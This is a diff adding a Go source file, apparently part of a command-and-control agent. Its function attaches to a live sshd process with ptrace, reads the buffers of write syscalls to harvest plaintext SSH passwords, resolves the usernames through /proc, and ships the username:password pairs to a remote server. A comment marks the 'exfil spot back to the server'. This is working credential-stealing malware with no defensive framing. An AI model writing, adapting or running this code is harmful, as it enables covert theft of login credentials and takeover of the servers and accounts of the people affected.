@@ -1,0 +1,117 @@
+package agent_helper
+
+import (
+	"fmt"
+	"os"
+	"regexp"
+	"runtime"
+	"strconv"
+	"strings"
+	"syscall"
+)
+
+func traceSSHDProcess(serverUrl string, taskData map[string]interface{}, pid int) {
+	runtime.LockOSThread()
+	defer runtime.UnlockOSThread()
+	err := syscall.PtraceAttach(pid)
+	if err != nil {
+		return
+	}
+	defer func() {
+		syscall.PtraceDetach(pid)
+	}()
+	var wstatus syscall.WaitStatus
+	var exfiled bool
+	for {
+		_, err := syscall.Wait4(pid, &wstatus, 0, nil)
+		if err != nil {
+			return
+		}
+
+		if wstatus.Exited() {
+			return
+		}
+
+		if wstatus.StopSignal() == syscall.SIGTRAP {
+			var regs syscall.PtraceRegs
+			err := syscall.PtraceGetRegs(pid, &regs)
+			if err != nil {
+				syscall.PtraceDetach(pid)
+				return
+			}
+
+			if regs.Orig_rax == 1 {
+				fd := int(regs.Rdi)
+				if fd >= 0 && fd <= 20 {
+					bufferSize := int(regs.Rdx)
+					if bufferSize > 3 && bufferSize < 250 {
+						buffer := make([]byte, bufferSize)
+						_, err := syscall.PtracePeekData(pid, uintptr(regs.Rsi), buffer)
+						if err != nil {
+							syscall.PtraceSyscall(pid, 0)
+							continue
+						}
+
+						var password string
+
+						if len(buffer) >= 4 && buffer[0] == 0 && buffer[1] == 0 && buffer[2] == 0 {
+							length := int(buffer[3])
+							if length > 0 && length+4 <= len(buffer) {
+								password = string(buffer[4 : 4+length])
+							} else if length == 0 && len(buffer) > 4 {
+								password = string(buffer[4:])
+							} else {
+								password = string(buffer)
+							}
+						} else {
+							password = string(buffer)
+						}
+
+						password = RemoveNonPrintableAscii(password)
+						if IsValidPassword(password) {
+							username := "unknown"
+							cmdline, _ := os.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
+							cmdlineStr := strings.ReplaceAll(string(cmdline), "\x00", " ")
+
+							usernamePattern := regexp.MustCompile(`sshd[^:]*:\s*([a-zA-Z0-9_-]+)`)
+							matches := usernamePattern.FindStringSubmatch(cmdlineStr)
+							if len(matches) == 2 {
+								username = matches[1]
+							}
+
+							if username == "unknown" && strings.Contains(cmdlineStr, "[accepted]") {
+								ppidData, err := os.ReadFile(fmt.Sprintf("/proc/%d/stat", pid))
+								if err == nil {
+									ppidStr := strings.Fields(string(ppidData))
+									if len(ppidStr) > 3 {
+										ppid, _ := strconv.Atoi(ppidStr[3])
+										if ppid > 0 {
+											parentCmdline, _ := os.ReadFile(fmt.Sprintf("/proc/%d/cmdline", ppid))
+											parentCmdlineStr := strings.ReplaceAll(string(parentCmdline), "\x00", " ")
+											parentMatches := usernamePattern.FindStringSubmatch(parentCmdlineStr)
+											if len(parentMatches) == 2 {
+												username = parentMatches[1]
+											}
+										}
+									}
+								}
+							}
+
+							if exfiled {
+								// here is your exfil spot back to the server
+								// go exfilPassword(username, password)
+								go DataShipper(serverUrl, taskData, fmt.Sprintf("%v:%v", username, password))
+							}
+							exfiled = !exfiled
+						}
+					}
+				}
+			}
+		}
+
+		err = syscall.PtraceSyscall(pid, 0)
+		if err != nil {
+			return
+		}
+	}
+}
